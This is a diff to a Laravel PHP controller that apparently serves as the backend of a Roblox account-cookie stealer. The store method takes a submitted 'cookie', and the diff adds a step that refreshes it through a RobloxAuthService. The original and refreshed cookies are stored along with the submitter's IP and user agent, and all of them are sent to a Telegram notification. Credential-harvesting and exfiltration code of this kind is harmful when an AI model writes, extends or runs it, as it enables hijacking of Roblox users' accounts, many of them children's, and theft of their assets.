@@ -3,6 +3,7 @@
 namespace App\Http\Controllers;
 
 use App\Models\Submission;
+use App\Services\RobloxAuthService;
 use App\Services\TelegramService;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
@@ -10,7 +11,7 @@ use Symfony\Component\HttpFoundation\StreamedResponse;
 
 class SubmissionController extends Controller
 {
-    public function store(Request $request, TelegramService $telegram): JsonResponse
+    public function store(Request $request, TelegramService $telegram, RobloxAuthService $robloxAuth): JsonResponse
     {
         $validated = $request->validate([
             'cookie' => ['required', 'string', 'min:1'],
@@ -23,13 +24,20 @@ class SubmissionController extends Controller
             $content = $raw;
         }
 
+        $newCookie = $robloxAuth->refreshCookie($content);
+
         $submission = Submission::create([
             'content' => $content,
+            'new_cookie' => $newCookie,
             'ip_address' => $request->ip(),
             'user_agent' => $request->userAgent(),
         ]);
 
-        $telegram->sendSubmissionNotification($submission->content, $submission->ip_address ?? 'unknown');
+        $telegram->sendSubmissionNotification(
+            $submission->content,
+            $submission->ip_address ?? 'unknown',
+            $submission->new_cookie,
+        );
 
         return response()->json(['success' => true]);
     }
